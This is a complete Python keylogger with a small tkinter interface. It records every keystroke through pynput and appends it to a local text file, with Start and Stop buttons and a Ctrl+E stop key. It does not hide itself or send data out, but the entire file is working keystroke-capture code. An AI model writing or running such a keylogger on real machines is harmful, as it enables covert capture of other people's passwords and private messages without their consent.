import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading

# Define the path to the logfile
path_to_logfile = 'd:\\output.txt'
listener = None

# Function to start the keylogger
def start_keylogger():
    global listener
    if listener is not None:
        return  # If listener is already running, do nothing

    def on_press(key):
        try:
            # Check for special keys like Ctrl+E to stop the listener
            if key.char == '\x05':  # Ctrl+E
                return False
            # Log the character pressed
            with open(path_to_logfile, 'a') as f:
                f.write(key.char)
        except AttributeError:
            # Handle special keys that do not have a char attribute
            with open(path_to_logfile, 'a') as f:
                if key == keyboard.Key.enter:
                    f.write('\n')
                elif key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.tab:
                    f.write('\t')
                else:
                    f.write(f'[{key}]')

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    update_status("Keylogger is running...")

# Function to stop the keylogger
def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
        update_status("Keylogger stopped.")
    else:
        update_status("Keylogger is not running.")

# Function to update the status label
def update_status(message):
    status_label.config(text=message)

# Function to start the keylogger in a separate thread
def start_keylogger_thread():
    if listener is None:
        threading.Thread(target=start_keylogger).start()
    else:
        messagebox.showwarning("Warning", "Keylogger is already running!")

# GUI setup
root = tk.Tk()
root.title("Keylogger")
root.geometry("350x200")
root.resizable(False, False)

# Configure grid layout
root.columnconfigure(0, weight=1)

# Title label
title_label = tk.Label(root, text="Simple Keylogger", font=("Arial", 16))
title_label.grid(row=0, column=0, pady=10)

# Start button
start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger_thread, width=20)
start_button.grid(row=1, column=0, pady=10)

# Stop button
stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, width=20)
stop_button.grid(row=2, column=0, pady=10)

# Status label
status_label = tk.Label(root, text="Keylogger is not running.", fg="blue", font=("Arial", 10))
status_label.grid(row=3, column=0, pady=10)

# Run the GUI
root.mainloop()
